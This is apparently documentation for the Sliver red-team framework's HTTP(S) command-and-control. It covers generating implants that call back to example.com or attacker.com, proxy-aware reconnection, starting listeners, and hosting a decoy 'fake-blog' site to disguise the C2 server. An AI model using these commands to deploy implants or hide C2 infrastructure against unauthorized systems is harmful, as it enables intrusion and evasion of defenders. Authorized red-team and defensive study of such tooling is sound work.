
⚠️ __This page is a work in progress__

# Setup

Sliver supports proxy-aware C2 over both HTTP and HTTPS, however since Sliver does not rely upon the SSL/TLS layer for security these protocols are considered somewhat synonymous. There are separate commands for the listeners but an implant generated with `--http` may attempt to connect over both HTTP and HTTPS (see "under the hood" for more details.
 

## Generate the Implant

Sliver implants are compiled with a baked-in (but obfuscated of course) server domain that they will reach back out to. To generate a sliver implant that communicates to a server at `example.com` run the following:

#### Basic Example

```
sliver > generate --http example.com --os mac

[*] Generating new darwin/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
```

#### Multiple Domains

You can also specify multiple domains, in the event the implant cannot connect to the first it will subsequently attempt to connect to each domain you specified in order. Subsequent attempts are made based on the `--reconnect` argument (default 60 seconds). If no attempts are successful, the implant will loop across all of the domains until `--max-errors` (default 1000) is reached, at which point the implant will terminate execution:

```
sliver > generate --http example.com,attacker.com

[*] Generating new windows/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
```

#### Proxies

The implant attempts to auto-detect proxy settings using a modified version of the [go-get-proxied](https://github.com/rapid7/go-get-proxied) library. It supports detection of system proxy settings on Windows, MacOS, and Linux. In the event the implant cannot make a successful HTTP/HTTPS connection for a given domain using the system proxy settings, it will also attempt to make a connection to the same domain ignoring the proxy settings. The order of connection attempts is as follows:

1. HTTPS over system proxy
1. HTTP over system proxy
1. HTTPS direct connect
1. HTTP direct connect


#### Proxy Configuration

The priority of retrieval is the following:
-  **Windows**
   - Environment Variable: `HTTPS_PROXY`, `HTTP_PROXY`, `FTP_PROXY`, or `ALL_PROXY`. `NO_PROXY` is respected.
   - Internet Options: Automatically detect settings (`WPAD`)
   - Internet Options: Use automatic configuration script (`PAC`)
   - Internet Options: Manual proxy server
   - WINHTTP: (`netsh winhttp`)
- **Linux**
   - Environment Variable: `HTTPS_PROXY`, `HTTP_PROXY`, `FTP_PROXY`, or `ALL_PROXY`. `NO_PROXY` is respected.
- **MacOS**
   - Environment Variable: `HTTPS_PROXY`, `HTTP_PROXY`, `FTP_PROXY`, or `ALL_PROXY`. `NO_PROXY` is respected.
   - Network Settings: `scutil`


## Start the Listener 

To start an HTTP listener use the `http` command, with no parameters this will start a listener on port 80 and respond to any domain (i.e., HTTP `Host:`) that comes in:

```
sliver > http
```

You can optionally restrict the listener to only respond to specific domain using the `--domain` flag, currently each listener can only accept a single domain (but you can start any number of listeners you want):

```
sliver > http --domain example.com
```


## Static Content

Sliver can stand up a website on your HTTP(S) listener in order to make the server look more legitimate. For example, you could put a default IIS index page here and mimic a normal-looking server in case someone comes by snooping. You can manage static content using the `websites` command (see `websites --help`):

```
websites --website fake-blog --web-path / --content ./index.html add
```

Each "website" is identified by a name (`fake-blog` in the example above) and is essentially just key<->value pairs request paths (e.g. `/foo/bar.html`) and response's content. Currently we don't support any regex matching for paths, it has to be an exact match, so keep that in mind if you're linking to content.

__Note:__ C2 related messages are identified, intercepted, and responded to prior to checking for user-provided `website` content, so you can actually map content to any URL used for C2.

To use your website with an HTTP(S) listener, specify it using `--website` when you start the listener:

```
sliver > http --website fake-blog --domain example.com
```

## SSL/TLS Certificates

The `http` listener also supports automatic TLS certificates via Let's Encrypt, which can be enabled using the `--lets-encrypt` flag.

```
sliver > https --domain example.com --lets-encrypt
```

This uses Let's Encrypt/ACME HTTP validation, so the listener will need the ability to start a public listener and you'll need to have the DNS for your `--domain` pointed to the Sliver server.

You can also upload your own SSL/TLS certificate/key pairs:

```
sliver > https --domain example.com --cert ./cert.pem --key ./key.pem --website fake-blog
```

# Under the Hood



